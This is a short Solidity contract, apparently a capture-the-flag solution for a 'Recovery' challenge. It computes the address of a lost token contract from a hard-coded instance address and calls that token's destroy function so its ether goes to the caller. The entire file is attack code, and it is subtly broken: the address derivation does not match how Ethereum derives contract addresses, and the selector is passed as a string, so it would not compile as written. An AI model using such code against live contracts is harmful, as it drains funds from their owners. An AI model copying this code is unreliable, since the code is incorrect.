pragma solidity ^0.8.0;
contract RecoveryAttack {
    address private constant RECOVERY_INSTANCE = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    function attack() external {
        bytes32 hash = keccak256(abi.encodePacked(RECOVERY_INSTANCE, 1));
        address token = address(uint160(uint256(hash) >> 96));
        (bool success, ) = token.call(
            abi.encodeWithSelector("0x4f6ccce7", payable(msg.sender)) // destroy function signature
        );
        require(success, "Attack failed");
    }
}

interface SimpleToken {
    function destroy(address payable to) external;
}
